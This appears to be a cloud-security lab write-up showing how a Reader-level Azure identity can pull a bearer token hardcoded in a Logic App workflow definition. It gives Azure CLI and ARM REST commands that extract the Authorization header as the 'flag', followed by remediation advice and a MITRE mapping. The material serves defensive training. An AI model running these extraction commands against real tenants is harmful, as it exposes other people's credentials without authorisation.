# Logic App — Hardcoded Credentials in Workflow Definition

**Provider:** Azure | **Category:** Integration / Secrets

## Scenario

A team built an Azure Logic App to send hourly sync notifications to a backend API.
To authenticate, they hardcoded a bearer token directly in the HTTP action's
`Authorization` header — inside the workflow definition JSON.

Any identity with **Reader** on the resource group can retrieve the complete workflow
definition, including the full action definitions with all header values in plaintext.

## Attack Path

```
[Attacker] Azure AD user (Reader on Resource Group)
    |
    v
az logic workflow show  -->  full workflow definition JSON
    |
    v
definition.actions["Notify-Backend"].inputs.headers.Authorization  -->  flag
```

### Step 1 — Login as the attacker

```bash
az login --username <attacker_upn> --password <attacker_password>
```

### Step 2 — Retrieve the workflow definition

```bash
RESOURCE_GROUP="<resource_group_name>"
WORKFLOW="<workflow_name>"

az logic workflow show \
  --name "${WORKFLOW}" \
  --resource-group "${RESOURCE_GROUP}" \
  --output json
```

### Step 3 — Extract the Authorization header

```bash
az logic workflow show \
  --name "${WORKFLOW}" \
  --resource-group "${RESOURCE_GROUP}" \
  --query "definition.actions.\"Notify-Backend\".inputs.headers.Authorization" \
  --output tsv
```

### Alternative — ARM REST API

```bash
TOKEN=$(az account get-access-token --query accessToken -o tsv)
SUBSCRIPTION_ID=$(az account show --query id -o tsv)

curl -s \
  "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Logic/workflows/${WORKFLOW}?api-version=2016-06-01" \
  -H "Authorization: Bearer ${TOKEN}" | jq '.properties.definition.actions | to_entries[] | .value.inputs.headers'
```

## How to Fix in Production

1. **Use Key Vault references** — store the token in Key Vault and reference it in the
   Logic App connector using a Managed Identity, not a hardcoded string.
2. **Use Logic App Managed Identity connectors** — the built-in HTTP connector supports
   Managed Identity authentication for Azure services without embedding tokens.
3. **Restrict Reader access** on Logic App workflows — apply least-privilege RBAC,
   as Reader returns the full definition including any embedded secrets.
4. **Rotate any token embedded in a workflow definition immediately** — treat it as
   compromised; the definition is visible in ARM audit logs.
5. **Scan Logic App definitions** in CI/CD:
   ```bash
   az logic workflow list --query "[*].{Name:name,RG:resourceGroup}" -o tsv | \
     while read name rg; do az logic workflow show -n "$name" -g "$rg" | grep -i "authorization"; done
   ```

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Unsecured Credentials: Credentials in Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) |
| Cloud Infrastructure Discovery | [T1580](https://attack.mitre.org/techniques/T1580/) |
| Valid Accounts: Cloud Accounts | [T1078.004](https://attack.mitre.org/techniques/T1078/004/) |
